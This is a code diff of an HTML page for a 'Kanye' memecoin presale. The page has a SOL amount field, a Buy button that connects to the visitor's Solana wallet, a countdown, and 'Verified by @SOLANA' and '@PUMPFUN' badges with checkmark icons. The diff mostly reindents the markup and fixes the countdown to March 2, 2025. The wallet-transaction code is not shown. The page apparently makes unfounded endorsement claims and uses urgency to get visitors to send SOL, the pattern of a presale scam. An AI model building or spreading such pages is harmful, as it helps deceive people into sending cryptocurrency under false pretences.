@@ -222,25 +222,25 @@
         </div>
         <h3 class="max">$YZY Presale Kanye Memecoin</h3>
         <div class="container">
-            <div class="solana-cont">
-                <div class="goal">
-                <div class="color">      
-                    <p class="sol-text">67%</p> 
-                </div>
-                </div>
-                <p class="text">500 SOL</p>
-                <input class="place" id="amount" placeholder="0 SOL ≈ YZY" onkeydown="enter()">
-                <button class="buy" onclick="bought()">Buy</button>
-            </div>    
+                <div class="solana-cont">
+                    <div class="goal">
+                        <div class="color">      
+                            <p class="sol-text">67%</p> 
+                        </div>
+                    </div>
+                    <p class="text">500 SOL</p>
+                    <input class="place" id="amount" placeholder="0 SOL ≈ YZY" onkeydown="enter()">
+                    <button class="buy" onclick="bought()">Buy</button>
+                </div>    
             </div>  
         </div>   
         <img src="pic/solana-raises-money-crypto-news-australia.png" class="sol" onclick="window.location.href='https://solana.com/'">
         <img src="pic/download.jpg" class="sol1" onclick="window.location.href='https://www.binance.com/en'">
         <div class="verification">Verified by <a class="sol-ig" onclick="window.location.href='https://x.com/solana'">@SOLANA <img src="pic/6270515.png" class="verified"></a><br> <br>
         <p class="pump-ig" onclick="window.location.href='https://x.com/pumpdotfun'">@PUMPFUN <img src="pic/6270515.png" class="verified"></p></div>
-    </body>
-    <script>
-        function bought() {
+</body>
+<script>
+    function bought() {
         const amount = document.getElementById("amount").value;
         document.getElementById("amount").value = "";
         window.solana.connect()
@@ -264,11 +264,11 @@
         .catch(() => {
         alert("Connection failed!");
         });
-        }
+    }
 
         function enter() {
             if (event.key === "Enter") {
-            bought();
+                bought();
             }
         }
 
@@ -282,11 +282,9 @@
 
         function updateCountdown() {
             const now = new Date();
-            const nextSaturday = new Date();
-            nextSaturday.setDate(now.getDate() + ((6 - now.getDay() + 7) % 7));
-            nextSaturday.setHours(0, 0, 0, 0);
+            const eventDate = new Date('March 2, 2025 12:00:00');
 
-            const distance = nextSaturday - now;
+            const distance = eventDate - now;
 
             if (distance < 0) {
             document.getElementById("countdown").innerHTML = "Event has passed!";
@@ -303,6 +301,6 @@
         }
 
         updateCountdown();
-    </script>
+</script>
 </script>
 </html>
